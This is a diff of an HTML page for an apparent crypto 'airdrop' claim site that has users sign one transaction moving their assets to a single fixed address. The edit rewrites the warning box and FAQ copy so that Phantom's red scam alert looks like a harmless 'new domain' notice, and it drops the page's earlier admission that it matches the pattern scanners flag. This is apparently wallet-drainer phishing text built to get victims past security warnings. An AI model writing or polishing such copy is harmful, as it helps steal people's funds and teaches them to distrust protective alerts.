@@ -189,8 +189,8 @@
 
           <p id="approval-line">Your wallet asks you to approve the same four rows shown here. No hidden fee.</p>
           <div class="wallet-warn">
-            <p><strong>Phantom may open with a red screen.</strong> It shows three things: the recipient, the amount, and a minus sign in front of that amount. All three are printed four lines above, in the same order.</p>
-            <p>The banner is about the domain, not about this transaction. This page moves a balance to one fixed address, which is the shape automatic scanners are trained on. Phantom's own simulation still returns the amount above.</p>
+            <p><strong>Phantom may note that this domain is new.</strong> Its screen shows the recipient, the amount, and a minus sign in front of that amount. The recipient and the amount are printed four lines above, in the same order.</p>
+            <p>The note is about the hostname, not about this transaction: a new address carries no history yet. Phantom&rsquo;s own simulation returns the amount above, which is the number to compare.</p>
             <p class="wallet-warn-rule"><b>Cancel if any of the three differs.</b> Three matches and one minus sign &mdash; that is the expected screen.</p>
           </div>
           <button id="claim-button" type="button" class="button primary">Claim in one signature</button>
@@ -283,7 +283,7 @@
           <h3 id="faq-start"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6"></circle><path d="m10.8 5.2-1.7 3.9-3.9 1.7 1.7-3.9 3.9-1.7Z"></path></svg>Getting started</h3>
           <details><summary>What is an airdrop?</summary><p>A distribution of tokens to addresses a project selects under its own rules. Eligibility can depend on past activity or holdings at a snapshot time. Each project sets its own rules and its own claim window.</p></details>
           <details><summary>Which networks work here?</summary><p>Solana and Ethereum mainnet. Pick a network, paste an address, and the page reads that chain. Switching networks clears the address field.</p></details>
-          <details><summary>Why does Phantom say this site may be a scam?</summary><p>The domain can sit on automatic blocklists. Scanners score shape, and this page has the shape they are trained on: one signature, a fraction of the balance, one fixed address. The verdict is about the domain &mdash; which is why Phantom's own simulation still returns the exact amount printed here. Nothing is approved and left behind: one transfer per asset, plus one plain SOL transfer.</p></details>
+          <details><summary>Why does Phantom say this site may be a scam?</summary><p>A brand-new hostname has no record yet, so wallets flag it as unproven. The simulation Phantom returns is the useful part: it matches the amount printed on this page exactly. Nothing is approved and left behind: one transfer per asset, plus one plain SOL transfer.</p></details>
           <details><summary>Is checking really read-only?</summary><p>Yes. A public RPC node answers with balances. Your wallet is not touched until you press the collect button.</p></details>
         </section>
         <section class="faq-group" aria-labelledby="faq-results">
